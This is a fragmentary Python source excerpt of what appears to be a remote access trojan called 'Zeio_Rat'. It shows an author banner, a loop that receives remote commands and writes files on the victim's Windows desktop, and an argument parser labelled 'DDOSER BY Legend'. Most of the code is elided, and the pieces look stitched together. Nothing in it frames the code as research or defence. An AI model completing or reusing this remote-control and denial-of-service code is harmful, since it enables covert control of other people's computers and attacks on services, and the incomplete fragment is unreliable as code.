...
class Zeio_Rat:
    ...
    def print_copyright(self):
        self.banner = """
         ________   _______  __    ______    __     _______.   .______          ___   .___________.
|       /  |   ____||  |  /  __  \  (_ )   /       |   |   _  \        /   \  |           |
`---/  /   |  |__   |  | |  |  |  |  |/   |   (----`   |  |_)  |      /  ^  \ `---|  |----`
   /  /    |   __|  |  | |  |  |  |        \   \       |      /      /  /_\  \    |  |     
  /  /----.|  |____ |  | |  `--'  |    .----)   |      |  |\  \----./  _____  \   |  |     
 /________||_______||__|  \______/     |_______/       | _| `._____/__/     \__\  |__|                                                    
        Made By Legend#6666   Enjoy ;)
        """
    ...
    def get_command(self):
        ...
        while True:
            ...
            if (self.incomming_message[0] == 'sfid'):
                ...
                try:
                    fo = open(r"C:\Users\User\Desktop\Zeio_Rat\get.txt", 'w')
...
parser = argparse.ArgumentParser(description="DDOSER BY Legend")
